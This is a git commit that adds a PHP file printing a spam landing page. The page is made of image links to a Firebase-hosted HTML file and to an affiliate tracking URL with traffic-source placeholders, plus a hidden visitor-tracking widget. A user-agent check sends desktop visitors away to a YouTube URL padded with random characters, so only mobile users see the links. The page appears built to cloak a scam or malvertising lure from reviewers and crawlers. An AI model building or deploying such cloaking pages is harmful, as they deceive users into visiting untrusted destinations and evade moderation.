8efb00911b66ea10466f4da7ccd06cebb3467fc2
anueljhay <84647597+anueljhay@users.noreply.github.com>
2021-09-27 19:56:05 +0800

    Create index.php

---
+++ index.php
@@ -0,0 +1,25 @@
+<?php
+
+// Genero: ProgramasProgramacion.com
+echo "<p></p><div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://firebasestorage.googleapis.com/v0/b/gdfghdte.appspot.com/o/h%2F8468468468.html?alt=media&token=6750d6c5-6ddc-4dfa-b03d-92a39241ee25\" style=\"margin-left: 1em; margin-right: 1em;\"><img border=\"0\" data-original-height=\"508\" data-original-width=\"877\" height=\"370\" src=\"https://1.bp.blogspot.com/-nyOZ62GAK14/YOE3KVaRofI/AAAAAAAAABA/xRJkMvOSHQMy2HmGhu4DC3HqErQe61_owCLcBGAsYHQ/w640-h370/1.png\" width=\"640\" /></a></div><br /><div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://firebasestorage.googleapis.com/v0/b/gdfghdte.appspot.com/o/h%2F8468468468.html?alt=media&token=6750d6c5-6ddc-4dfa-b03d-92a39241ee25\" style=\"margin-left: 1em; margin-right: 1em;\"><img border=\"0\" data-original-height=\"511\" data-original-width=\"878\" height=\"372\" src=\"https://1.bp.blogspot.com/-7pmkelqoE-0/YOE3KDTWHBI/AAAAAAAAAA8/R4xzOeeVCFUGAgI_lA7hBQViyBz6x9dJACLcBGAsYHQ/w640-h372/2.png\" width=\"640\" /></a></div><br /><div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://www.mclass.xyz/?sl=5158402-05694&data1=Track1&data2=Track2&tag={External_ID_from_traffic_source}&website={subID}&placement={sub_subID}\" style=\"margin-left: 1em; margin-right: 1em;\"><img border=\"0\" data-original-height=\"509\" data-original-width=\"878\" height=\"372\" src=\"https://1.bp.blogspot.com/-LsWB3rsBYJI/YOE3KFcSRiI/AAAAAAAAAA4/4tBnCUEAOA8fiTI3TxINgZIdCqsD8wslwCLcBGAsYHQ/w640-h372/3.png\" width=\"640\" /></a></div><br /><div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://www.mclass.xyz/?sl=5158402-05694&data1=Track1&data2=Track2&tag={External_ID_from_traffic_source}&website={subID}&placement={sub_subID}\" style=\"margin-left: 1em; margin-right: 1em;\"><img border=\"0\" data-original-height=\"508\" data-original-width=\"874\" height=\"372\" src=\"https://1.bp.blogspot.com/-E0Ft8ZTMU3Q/YOE3K524mlI/AAAAAAAAABE/Oo8aynhRSYYesIYuF2NR-yN3Ub12d-4qACLcBGAsYHQ/w640-h372/4.png\" width=\"640\" /></a></div><br /><div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://www.mclass.xyz/?sl=5158402-05694&data1=Track1&data2=Track2&tag={External_ID_from_traffic_source}&website={subID}&placement={sub_subID}\" style=\"margin-left: 1em; margin-right: 1em;\"><img border=\"0\" data-original-height=\"509\" data-original-width=\"878\" height=\"372\" src=\"https://1.bp.blogspot.com/-wX8Ah9dRKAE/YOE3LFnMnwI/AAAAAAAAABI/5fXghlx_MlIMqZt0kqTYz3u7LgbvgvKoACLcBGAsYHQ/w640-h372/5.png\" width=\"640\" /></a></div><br /> <p></p><div style=\"visibility: hidden;\"> <script src=\"//widgets.amung.us/small.js\" type=\"text/javascript\"></script><script type=\"text/javascript\">WAU_small('ghjfiii')</script></div>\n";
+echo "\n";
+echo "<script type=\"text/javascript\">\n";
+echo "//<![CDATA[\n";
+echo " function h(r, a) { var t = \"\"; if (\"mix\" == a) var h = \n";
+echo "\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\"; else var h = \n";
+echo "\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\"; for (var n = 0; r > n; n++) t += h.charAt(Math.floor(Math.random() * \n";
+echo "h.length)); return t };\n";
+echo "\n";
+echo "        var device = navigator.userAgent\n";
+echo "        \n";
+echo "        if (device.match(/Iphone/i)|| device.match(/Ipod/i)|| device.match(/Android/i)|| device.match(/J2ME/i)|| device.match(/BlackBerry/i)|| device.match(/iPhone|iPad|iPod/i)|| device.match(/Opera Mini/i)|| device.match(/IEMobile/i)|| device.match(/Mobile/i)|| device.match(/Windows Phone/i)|| device.match(/windows mobile/i)|| device.match(/windows ce/i)|| device.match(/webOS/i)|| device.match(/palm/i)|| device.match(/bada/i)|| device.match(/series60/i)|| device.match(/nokia/i)|| device.match(/symbian/i)|| device.match(/HTC/i))\n";
+echo "        {\n";
+echo "         \n";
+echo "        }else\n";
+echo "{\n";
+echo " window.location = \"https://www.youtube.com/watch?v=_Cfr8r_arqc\"+ h(23, '')+\"/?ref=bookmarks\";\n";
+echo "}\n";
+echo "//]]>\n";
+echo "</script>\n";
+
+?>
